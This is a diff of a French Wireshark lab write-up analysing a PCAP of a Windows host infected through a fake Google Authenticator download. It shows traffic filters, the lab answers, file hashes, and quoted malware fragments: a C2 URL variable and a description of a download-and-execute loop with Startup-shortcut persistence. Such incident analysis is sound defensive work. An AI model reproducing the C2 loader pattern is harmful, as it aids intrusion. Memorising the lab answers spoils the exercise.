@@ -8,7 +8,7 @@
 ### 📌 Contexte
 
 - Un utilisateur télécharge un faux logiciel (Google Authenticator) depuis un site frauduleux, entraînant l’infection de son poste Windows et la communication avec plusieurs serveurs C2. 
-- Ce document contient une **analyse pas-à-pas avec captures d’écran** pour chaque question.
+- Ce document contient une **analyse 'step-by-step' avec captures d’écran** pour chaque question.
   
 <img src="images/open.png" alt="open" width="800"/>
 
@@ -81,16 +81,17 @@
 <details>
     <summary>💡 Étapes</summary>
 
-  - Étape 1 : Dans certains PCAPs, tu peux retrouver le nom d’hôte Windows de la victime grâce au trafic **NBNS ou SMB/SMB2**. Utiliser le filtre approprié.
+  - Étape 1 : Dans certains PCAPs, tu peux retrouver le nom d’hôte Windows de la victime grâce au trafic **NBNS ou SMB/SMB2**.  
 
-        nbns or smb or smb2
+        nbns or smb or smb2 
+
 </details>
 
 
 <details>
   <summary>✅ Réponse</summary>
   
-`DESKTOP-L8C5GSJ`
+`DESKTOP-L8C5GSJ`  
 </details>
 
 <details>
@@ -131,7 +132,7 @@
 <details>
     <summary>💡 Étapes</summary>
     
-- Étape 1 : Appliquer un filtre pour isoler les requêtes DNS émises par l’hôte 10.1.17.215.
+- Étape 1 : Appliquer un filtre pour isoler les requêtes DNS émises par l’hôte `10.1.17.215`.
   
       ip.src == 10.1.17.215 && (dns && dns.flags.response == 0) && dns.qry.name matches "(auth|google|authenticator)"
   
@@ -198,7 +199,7 @@
 <details>
     <summary>💡 Étapes</summary>
 
-  - Étape 1 : Appliquer un filtre pour identifier tous les adresses IP sortants de l’hôte infecté.
+  - Étape 1 : Appliquer un filtre pour identifier toutes les adresses IP sortants de l’hôte infecté.
 
         ip.src == 10.1.17.215 && (http.request or tls.handshake == 1 or (tcp.flags.syn == 1 && tcp.flags.ack == 0)) && !(ssdp) && ip.dst != 10.1.17.0/24
         
@@ -207,7 +208,7 @@
           ⚠️ Trafic vers réseau interne (10.1.17.0/24)
           ⚠️ Services connus comme Microsoft, Google, Edge, etc.
 
-  - Étape 3 : Vérifier la réputation des adresses IP suspects via [VirusTotal](https://www.virustotal.com/gui/home/upload).
+  - Étape 3 : Vérifier la réputation des adresses IP suspectes via [VirusTotal](https://www.virustotal.com/gui/home/upload).
 </details>
 
 
@@ -314,15 +315,15 @@ $ip = 'http://5.252.153.241/'
 $url = $ip+$serial
 ```
 
-- Boucle infinie de téléchargement et exécution de commandes depuis le serveur C2, avec l'ajout de pauses de 5 secondes pour limiter la détection.
+- Boucle infinie de téléchargement/exécution de commandes depuis C2, avec ajout de pauses de 5 secondes pour limiter la détection.
 
 3️⃣ Téléchargement de fichiers et persistance
 
 - Création du dossier `C:\ProgramData\huo` et téléchargement de plusieurs fichiers :
 - `TeamViewer.exe` → exécutable principal
-- `Teamviewer_Resource_fr.dll` → bibliothèque de support
-- `TV.dll` → bibliothèque additionnelle
-- `pas.ps1` → script secondaire
+- `Teamviewer_Resource_fr.dll` 
+- `TV.dll` 
+- `pas.ps1`
 - Création d’un raccourci dans le dossier Startup pour assurer la persistance (`.lnk`):
 
 ```
@@ -361,34 +362,34 @@ $aMCdlKxvWQWiMMrpeNo = '0uR'
 
 <img src="images/export.png" alt="export" width="800"/>
 
-- Le fichier `[TeamViewer[.]exe]` a été télécharger directement depuis le PCAP (`Files -> Export Objects -> HTTP`)
-- SHA-256 : `904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e `
+- Le fichier `[TeamViewer[.]exe]` a été téléchargé directement depuis le PCAP (`Files -> Export Objects -> HTTP`)
+- SHA-256 : `904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e`
 - Type : Win32 EXE file
-- Community score : flagged 0 sur 72 == probablement clean (ou non reconnu)
+- Community score : flagged 0 sur 72 = probablement clean (ou non reconnu)
 - [Lien VirusTotal](https://www.virustotal.com/gui/file/904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e/details)
 
 ---
 
-- Le fichier `[TeamViewer_Resource[.]dll]` a été télécharger directement depuis le PCAP (`Files -> Export Objects -> HTTP`)
-- SHA-256 : `9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192 `
+- Le fichier `[TeamViewer_Resource[.]dll]` a été téléchargé directement depuis le PCAP (`Files -> Export Objects -> HTTP`)
+- SHA-256 : `9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192`
 - Type : Win32 DLL file
-- Community score : flagged 0 sur 72 == probablement clean (ou non reconnu)
+- Community score : flagged 0 sur 72 = probablement clean (ou non reconnu)
 - [Lien VirusTotal](https://www.virustotal.com/gui/file/9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192/details)
 
 ---
 
-- Le fichier `[TV[.]txt]` a été télécharger directement depuis le PCAP (`Files -> Export Objects -> HTTP`)
+- Le fichier `[TV[.]txt]` a été téléchargé directement depuis le PCAP (`Files -> Export Objects -> HTTP`)
 - SHA-256 : `3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7`
 - Type : Win32 DLL file
-- Community score : flagged par 44 sur 72 == probablement malveillant
+- Community score : flagged par 44 sur 72 = probablement malveillant
 - [Lien VirusTotal](https://www.virustotal.com/gui/file/3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7/details)
 
 ---
 
-- Le fichier `pas[.]ps1` a été télécharger directement depuis le PCAP (`Files -> Export Objects -> HTTP`)
+- Le fichier `pas[.]ps1` a été téléchargé directement depuis le PCAP (`Files -> Export Objects -> HTTP`)
 - SHA-256 : `a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e`
 - Type : TXT file
-- Community score : flagged par 24 sur 60 == probablement malveillant
+- Community score : flagged par 24 sur 60 = probablement malveillant
 - [Lien VirusTotal](https://www.virustotal.com/gui/file/a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e/details)
 
 
